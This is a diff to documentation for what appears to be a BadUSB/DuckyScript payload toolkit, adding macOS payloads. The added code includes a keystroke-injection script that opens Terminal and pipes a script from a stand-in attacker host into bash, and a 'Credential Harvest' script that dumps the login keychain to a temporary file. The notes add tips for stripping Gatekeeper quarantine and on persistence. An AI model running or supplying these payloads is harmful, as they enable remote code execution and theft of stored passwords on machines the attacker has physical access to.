@@ -45,6 +45,46 @@ STRING Write-Output "Hello from NullSec"
 ENTER
 ```
 
+## macOS Payloads
+
+macOS payloads follow standard DuckyScript syntax but require platform-specific adjustments:
+
+- Use `COMMAND` instead of `GUI` for keyboard shortcuts
+- Use `CTRL+SHIFT+4` for screenshots instead of `PRNTSCREEN`
+- Terminal commands replace PowerShell/Command Prompt
+- `COMMAND SPACE` opens Spotlight for quick app launching
+
+### macOS Examples
+
+**Terminal Execution:**
+```duckyscript
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING curl http://attacker.com/script.sh | bash
+ENTER
+```
+
+**Credential Harvest:**
+```duckyscript
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING keychain
+ENTER
+DELAY 1000
+STRING security dump-keychain -d login.keychain > /tmp/creds.txt
+ENTER
+```
+
+### Notes
+- macOS Gatekeeper may block unsigned scripts; use `xattr -d com.apple.quarantine <file>`
+- T2/M1 chip security restrictions may limit certain persistence methods
+- Always test payloads on a VM before deployment
+
 ## OS Compatibility
 
 | Payload | Windows | macOS | Linux |
